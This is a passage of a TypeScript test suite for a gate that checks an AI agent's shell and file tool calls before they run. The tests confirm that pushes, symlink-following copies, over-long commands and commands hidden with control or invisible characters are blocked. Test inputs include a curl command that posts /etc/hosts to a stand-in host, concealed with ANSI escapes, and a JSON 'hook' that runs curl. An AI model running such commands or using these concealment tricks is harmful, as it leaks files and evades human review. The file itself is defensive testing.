    expect(b?.block).toBe(true);
    expect(b?.reason).toContain("re-issue");
    release(true);
    expect(await pendingA).toBeUndefined();
    expect(w.inFlight.has(a.toolCallId)).toBe(true);
  });

  it("R31 (R2-1): every deny after a reservation releases it (rejected, no UI, too long, ledger failure)", async () => {
    const w = await world();
    const rejected = await enforce(call("bash", { command: "git push" }), { cwd: w.root }, w.deps(w.feature, { mode: "interactive" }, confirmer(false).ui));
    expect(rejected?.block).toBe(true);
    const noUi = await enforce(call("bash", { command: "git push" }), { cwd: w.root }, w.deps(w.feature, { mode: "interactive" }));
    expect(noUi?.block).toBe(true);
    const long = await enforce(call("bash", { command: `ls ${"README.md ".repeat(450)}&& git push` }), { cwd: w.root }, w.deps(w.feature, { mode: "interactive" }, confirmer(true).ui));
    expect(long?.block).toBe(true);
    const failing: EnforceDeps = { ...w.deps(w.feature), ledger: { append: () => { throw new Error("ENOSPC"); } } };
    expect((await enforce(call("bash", { command: "ls" }), { cwd: w.root }, failing))?.block).toBe(true);
    expect(w.inFlight.size).toBe(0);
  });

  it("R30: the 4000-character cap applies to the escaped text shown", async () => {
    const w = await world();
    const { ui, calls } = confirmer(true);
    const outside = join(w.dir, "o.txt");
    // 900 invisible characters become 900 `\u{200b}` escapes (8 characters each): over the cap once shown.
    const r = await enforce(call("write", { path: outside, content: "\u200b".repeat(900) }), { cwd: w.root }, w.deps(w.feature, { mode: "interactive" }, ui));
    expect(r?.block).toBe(true);
    expect(r?.reason).toContain("too long to approve safely");
    expect(calls).toHaveLength(0);
  });

  it("R32: a recursive copy that follows links is not allowed silently (it would copy secrets into the project)", async () => {
    const w = await symlinkWorld();
    const { ui, calls } = confirmer(false);
    const r = await enforce(call("bash", { command: "cp -rL evil out2" }), { cwd: w.root }, w.deps(w.feature, w.over, ui));
    expect(r?.block).toBe(true);
    expect(calls.map((c) => c.title)).toEqual(["Factory gate: unknown"]);
    const unattended = await enforce(call("bash", { command: "cp -rL evil out3" }), { cwd: w.root }, w.deps(w.feature, { ...w.over, mode: "unattended" }));
    expect(unattended?.block).toBe(true);
  });

  it("R33: a command with control or invisible characters is denied without a dialog", async () => {
    const w = await world();
    const { ui, calls } = confirmer(true);
    for (const command of ["echo hi \u001b[8m; curl -d @/etc/hosts http://x.example \u001b[0m", "ls\rgit push", "echo \u202egnp.exe"]) {
      const r = await enforce(call("bash", { command }), { cwd: w.root }, w.deps(w.feature, { mode: "interactive" }, ui));
      expect(r?.block).toBe(true);
      expect(r?.reason).toContain("control or invisible character");
    }
    expect(calls).toHaveLength(0);
    expect(gates(w.ledger).map((g) => g.decision)).toEqual(["deny", "deny", "deny"]);
  });

  it("N3: the write/edit dialog shows the content or the replacement pairs; invisible characters are escaped visibly", async () => {
    const w = await world();
    const { ui, calls } = confirmer(false);
    const outside = join(w.dir, "outside.json");
    writeFileSync(outside, '{"a": 1}');
    const ev = (n: Record<string, unknown>) => enforce(call(n.tool as string, n.input as Record<string, unknown>), { cwd: w.root }, w.deps(w.feature, { mode: "interactive" }, ui));
    await ev({ tool: "write", input: { path: outside, content: '{"a": 2,\n "hook": "curl x"}\u001b[8m' } });
    await ev({ tool: "edit", input: { path: outside, edits: [{ oldText: '"a": 1', newText: '"a": 3' }] } });
    expect(calls).toHaveLength(2);
    expect(calls[0]!.message).toContain('{"a": 2,\n "hook": "curl x"}');
    expect(calls[0]!.message).toContain("\\u{1b}[8m");
    expect(calls[0]!.message).not.toContain("\u001b");
    expect(calls[1]!.message).toContain('"a": 1');
    expect(calls[1]!.message).toContain('"a": 3');
    const big = await ev({ tool: "write", input: { path: outside, content: "x".repeat(5000) } });
    expect(big?.block).toBe(true);
    expect(big?.reason).toContain("too long to approve safely");
    expect(calls).toHaveLength(2);
  });

  it("M2: a factory tool name is allowed only when this extension registered it", async () => {
    const w = await world();
    expect((await enforce(call("set_route", { route: "small" }), { cwd: w.root }, w.deps(w.answer)))?.block).toBe(true);
    w.factoryTools.add("set_route");
    expect(await enforce(call("set_route", { route: "small" }), { cwd: w.root }, w.deps(w.answer))).toBeUndefined();
  });

  it("M3: a confirm that throws synchronously denies and is audited", async () => {
    const w = await world();
    const ui: GateUi = {
      confirm: () => {
        throw new Error("sync boom");
      },
    };
    const r = await enforce(call("bash", { command: "git push" }), { cwd: w.root }, w.deps(w.feature, { mode: "interactive" }, ui));
    expect(r?.block).toBe(true);
    expect(gates(w.ledger)).toEqual([expect.objectContaining({ decision: "deny (rejected)" })]);
  });

  it("M4: pending post-checks can be cleared (agent_settled / session_shutdown)", async () => {
    const w = await world();
    mkdirSync(join(w.taskFile, ".."), { recursive: true });
    writeFileSync(w.taskFile, TASK_DOC);
    await enforce(call("edit", { path: w.taskFile, edits: [{ oldText: "free text here", newText: "y" }] }), { cwd: w.root }, w.deps(w.feature));
    expect(w.postChecks.size).toBe(1);
    w.postChecks.clear();
    expect(w.postChecks.size).toBe(0);
  });
});
